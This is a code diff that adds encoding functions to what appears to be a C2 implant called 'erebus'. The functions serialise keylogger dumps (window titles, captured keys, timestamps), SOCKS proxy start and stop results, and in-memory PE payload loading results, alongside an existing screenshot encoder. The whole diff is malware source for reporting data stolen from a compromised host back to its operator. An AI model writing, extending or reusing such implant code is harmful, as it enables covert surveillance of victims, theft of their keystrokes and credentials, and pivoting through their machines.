@@ -307,3 +307,65 @@ int erebus_pb_encode_screenshot_result(const uint8_t *img, size_t img_len, uint3
     *out_len = pw.len;
     return 1;
 }
+
+typedef struct {
+    char    window_title[256];
+    char    keys[256];
+    int64_t timestamp;
+} erebus_keylog_entry_enc;
+
+static int encode_keylog_entry(const erebus_keylog_entry_enc *e, uint8_t **out, size_t *out_len) {
+    erebus_pb_writer w;
+    if (!erebus_pb_writer_init(&w, 128)) return 0;
+    if (e->window_title[0]) erebus_pb_write_string(&w, 1, e->window_title);
+    if (e->keys[0]) erebus_pb_write_string(&w, 2, e->keys);
+    erebus_pb_write_int64(&w, 3, e->timestamp);
+    *out = w.data;
+    *out_len = w.len;
+    return 1;
+}
+
+int erebus_pb_encode_keylog_dump_result(const void *entries, size_t count, uint8_t **out, size_t *out_len) {
+    const erebus_keylog_entry_enc *ents = (const erebus_keylog_entry_enc *)entries;
+    erebus_pb_writer w;
+    if (!erebus_pb_writer_init(&w, 512)) return 0;
+    for (size_t i = 0; i < count; i++) {
+        uint8_t *sub = NULL;
+        size_t sub_len = 0;
+        if (!encode_keylog_entry(&ents[i], &sub, &sub_len)) { erebus_pb_writer_free(&w); return 0; }
+        erebus_pb_write_bytes(&w, 1, sub, sub_len);
+        free(sub);
+    }
+    *out = w.data;
+    *out_len = w.len;
+    return count > 0;
+}
+
+int erebus_pb_encode_socks_start_result(int success, uint32_t port, uint8_t **out, size_t *out_len) {
+    erebus_pb_writer w;
+    if (!erebus_pb_writer_init(&w, 32)) return 0;
+    erebus_pb_write_bool(&w, 1, success);
+    erebus_pb_write_uint32(&w, 2, port);
+    *out = w.data;
+    *out_len = w.len;
+    return 1;
+}
+
+int erebus_pb_encode_socks_stop_result(int success, uint8_t **out, size_t *out_len) {
+    erebus_pb_writer w;
+    if (!erebus_pb_writer_init(&w, 16)) return 0;
+    erebus_pb_write_bool(&w, 1, success);
+    *out = w.data;
+    *out_len = w.len;
+    return 1;
+}
+
+int erebus_pb_encode_peload_result(int success, const uint8_t *output, size_t output_len, uint8_t **out, size_t *out_len) {
+    erebus_pb_writer w;
+    if (!erebus_pb_writer_init(&w, 64)) return 0;
+    erebus_pb_write_bool(&w, 1, success);
+    if (output && output_len) erebus_pb_write_bytes(&w, 2, output, output_len);
+    *out = w.data;
+    *out_len = w.len;
+    return 1;
+}
